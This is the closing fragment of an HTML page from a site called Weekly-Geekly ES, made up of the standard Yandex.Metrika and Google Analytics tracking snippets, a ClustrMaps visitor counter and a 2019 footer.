<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>